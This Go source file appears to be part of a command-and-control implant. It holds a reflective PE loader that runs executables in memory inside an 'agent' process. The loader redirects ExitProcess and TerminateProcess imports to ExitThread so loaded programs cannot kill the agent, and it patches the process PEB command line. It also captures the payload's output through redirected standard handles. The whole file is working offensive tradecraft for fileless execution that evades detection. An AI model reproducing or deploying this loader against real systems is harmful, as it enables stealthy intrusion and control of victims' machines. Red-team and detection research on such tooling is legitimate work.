//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// procTerminateThread is used in peLoaderExecThread to kill a timed-out PE thread.
var procTerminateThread = kernel32.NewProc("TerminateThread")

// procNtQueryInformationProcessPE is used by peLoaderSetCommandLine to locate the PEB.
var procNtQueryInformationProcessPE = windows.NewLazySystemDLL("ntdll.dll").NewProc("NtQueryInformationProcess")

// peLoaderExecThread executes a PE entry point in a new thread with stdout/stderr capture.
func peLoaderExecThread(entryPoint uintptr, cmdLine string, timeout int) (string, error) {
	// Set up stdout/stderr capture via pipes
	var stdoutRead, stdoutWrite windows.Handle
	var sa windows.SecurityAttributes
	sa.Length = uint32(unsafe.Sizeof(sa))
	sa.InheritHandle = 1

	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe: %v", err)
	}
	defer windows.CloseHandle(stdoutRead)

	// Don't inherit the read end
	if err := windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0); err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("SetHandleInformation: %v", err)
	}

	// Save original handles
	origStdout, _ := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
	origStderr, _ := windows.GetStdHandle(windows.STD_ERROR_HANDLE)

	// Redirect stdout/stderr to our pipe
	windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, stdoutWrite)
	windows.SetStdHandle(windows.STD_ERROR_HANDLE, stdoutWrite)

	// Restore handles when done
	defer func() {
		windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, origStdout)
		windows.SetStdHandle(windows.STD_ERROR_HANDLE, origStderr)
	}()

	// Set command line in PEB for GetCommandLineW compatibility
	if cmdLine != "" {
		restoreCmdLine := peLoaderSetCommandLine(cmdLine)
		defer restoreCmdLine()
	}

	// Start reading pipe output in background
	var outputBuf strings.Builder
	var outputMu sync.Mutex
	outputDone := make(chan struct{})
	go func() {
		defer close(outputDone)
		buf := make([]byte, 4096)
		for {
			var bytesRead uint32
			err := windows.ReadFile(stdoutRead, buf, &bytesRead, nil)
			if err != nil || bytesRead == 0 {
				break
			}
			outputMu.Lock()
			outputBuf.Write(buf[:bytesRead])
			outputMu.Unlock()
		}
	}()

	// Create thread at entry point
	var threadID uint32
	hThread, _, lastErr := procCreateThread.Call(
		0,          // security attributes
		0,          // stack size (default)
		entryPoint, // start address
		0,          // parameter
		0,          // creation flags (run immediately)
		uintptr(unsafe.Pointer(&threadID)),
	)
	if hThread == 0 {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("CreateThread failed: %v", lastErr)
	}
	defer syscall.CloseHandle(syscall.Handle(hThread))

	// Wait for thread completion with timeout
	timeoutMs := uint32(timeout * 1000)
	ret, _, _ := procWaitSingleObject.Call(hThread, uintptr(timeoutMs))

	// Close write end of pipe to signal EOF to reader
	windows.CloseHandle(stdoutWrite)

	// Wait for output reader to finish
	<-outputDone

	outputMu.Lock()
	output := outputBuf.String()
	outputMu.Unlock()

	if ret == 0x00000102 { // WAIT_TIMEOUT
		// Terminate the thread if it timed out
		procTerminateThread.Call(hThread, 1)
		return output, fmt.Errorf("PE execution timed out after %ds", timeout)
	}

	return output, nil
}

// peLoaderResolveImportsHooked resolves imports with ExitProcess → ExitThread substitution.
// This prevents in-memory EXEs from killing the agent process when they call exit().
func peLoaderResolveImportsHooked(baseAddr uintptr, importRVA uintptr) error {
	descSize := unsafe.Sizeof(rlImportDescriptor{})

	// Resolve ExitThread address once — use same pattern as reflective-load
	k32Name := append([]byte("kernel32.dll"), 0)
	hK32, _, _ := procLoadLibraryARL.Call(uintptr(unsafe.Pointer(&k32Name[0])))
	exitThreadName := append([]byte("ExitThread"), 0)
	exitThreadAddr, _, _ := procGetProcAddressRL.Call(hK32, uintptr(unsafe.Pointer(&exitThreadName[0])))
	if exitThreadAddr == 0 {
		return fmt.Errorf("failed to resolve ExitThread")
	}

	for i := uintptr(0); ; i++ {
		desc := (*rlImportDescriptor)(unsafe.Pointer(baseAddr + importRVA + i*descSize))
		if desc.Name == 0 {
			break
		}

		dllName := readCString(baseAddr + uintptr(desc.Name))
		dllNameLower := strings.ToLower(dllName)

		// Load the DLL
		dllNameBytes := append([]byte(dllName), 0)
		hModule, _, loadErr := procLoadLibraryARL.Call(uintptr(unsafe.Pointer(&dllNameBytes[0])))
		if hModule == 0 {
			return fmt.Errorf("LoadLibrary(%s) failed: %v", dllName, loadErr)
		}

		// Walk IAT
		thunkRVA := desc.OriginalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = desc.FirstThunk
		}
		iatRVA := desc.FirstThunk

		for j := uintptr(0); ; j++ {
			thunkPtr := baseAddr + uintptr(thunkRVA) + j*8
			iatPtr := baseAddr + uintptr(iatRVA) + j*8

			thunkVal := *(*uint64)(unsafe.Pointer(thunkPtr))
			if thunkVal == 0 {
				break
			}

			var funcAddr uintptr
			var lastErr error
			isExitProcess := false

			if thunkVal&0x8000000000000000 != 0 {
				// Import by ordinal
				ordinal := uint16(thunkVal & 0xFFFF)
				funcAddr, _, lastErr = procGetProcAddressRL.Call(hModule, uintptr(ordinal))
			} else {
				// Import by name
				nameRVA := uint32(thunkVal)
				funcName := readCString(baseAddr + uintptr(nameRVA) + 2)
				funcNameBytes := append([]byte(funcName), 0)
				funcAddr, _, lastErr = procGetProcAddressRL.Call(hModule, uintptr(unsafe.Pointer(&funcNameBytes[0])))

				// Hook exit functions for kernel32.dll
				if dllNameLower == "kernel32.dll" || dllNameLower == "kernelbase.dll" {
					if funcName == "ExitProcess" || funcName == "TerminateProcess" {
						isExitProcess = true
					}
				}
			}

			if funcAddr == 0 {
				return fmt.Errorf("failed to resolve import in %s: %v", dllName, lastErr)
			}

			if isExitProcess {
				// Redirect ExitProcess/TerminateProcess → ExitThread
				*(*uintptr)(unsafe.Pointer(iatPtr)) = exitThreadAddr
			} else {
				*(*uintptr)(unsafe.Pointer(iatPtr)) = funcAddr
			}
		}
	}

	return nil
}

// peLoaderSetCommandLine patches the PEB CommandLine UNICODE_STRING so that
// GetCommandLineW/A returns the specified command line instead of the agent's
// real executable path. Returns a restore function that must be called after
// the PE thread completes to restore the original command line.
func peLoaderSetCommandLine(cmdLine string) func() {
	// Get PEB address via NtQueryInformationProcess(ProcessBasicInformation)
	hProcess, _, _ := procGetCurrentProcRL.Call()
	var pbi PROCESS_BASIC_INFORMATION
	var retLen uint32
	status, _, _ := procNtQueryInformationProcessPE.Call(
		hProcess,
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if status != 0 {
		return func() {} // silently fail — PE will still work, just with wrong cmdline
	}

	// Read ProcessParameters pointer from PEB+0x20
	processParamsPtr := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x20))
	if processParamsPtr == 0 {
		return func() {}
	}

	// CommandLine UNICODE_STRING is at ProcessParameters+0x70
	// Layout: Length(uint16) + MaximumLength(uint16) + pad(4) + Buffer(*uint16)
	cmdLineUS := (*unicodeString)(unsafe.Pointer(processParamsPtr + 0x70))

	// Save original values for restore
	origLength := cmdLineUS.Length
	origMaxLength := cmdLineUS.MaximumLength
	origBufAddr := cmdLineUS.Buffer
	origBuffer := make([]uint16, origLength/2)
	if origBufAddr != 0 && origLength > 0 {
		src := unsafe.Slice((*uint16)(unsafe.Pointer(origBufAddr)), origLength/2)
		copy(origBuffer, src)
	}

	// Encode new command line as UTF-16
	newUTF16, err := windows.UTF16FromString(cmdLine)
	if err != nil {
		return func() {}
	}
	// Length in bytes (excluding null terminator)
	newLenBytes := uint16((len(newUTF16) - 1) * 2)

	if newLenBytes <= cmdLineUS.MaximumLength {
		// Fits in existing buffer — write directly
		dst := unsafe.Slice((*uint16)(unsafe.Pointer(cmdLineUS.Buffer)), cmdLineUS.MaximumLength/2)
		copy(dst, newUTF16)
		cmdLineUS.Length = newLenBytes
	} else {
		// Need new buffer — allocate via VirtualAlloc (never freed, small leak acceptable)
		allocSize := uintptr(len(newUTF16) * 2)
		newBuf, _, allocErr := procVirtualAllocRL.Call(
			0,
			allocSize,
			rlMemCommit|rlMemReserve,
			rlPageReadWrite,
		)
		if newBuf == 0 {
			_ = allocErr
			return func() {}
		}
		dst := unsafe.Slice((*uint16)(unsafe.Pointer(newBuf)), len(newUTF16))
		copy(dst, newUTF16)
		cmdLineUS.Buffer = newBuf
		cmdLineUS.Length = newLenBytes
		cmdLineUS.MaximumLength = uint16(allocSize)
	}

	// Return restore function
	return func() {
		// Restore original command line
		cmdLineUS.Buffer = origBufAddr
		cmdLineUS.Length = origLength
		cmdLineUS.MaximumLength = origMaxLength
		if origBufAddr != 0 && len(origBuffer) > 0 {
			dst := unsafe.Slice((*uint16)(unsafe.Pointer(origBufAddr)), origMaxLength/2)
			copy(dst, origBuffer)
			// Null-terminate if space permits
			if int(origLength/2) < len(dst) {
				dst[origLength/2] = 0
			}
		}
	}
}
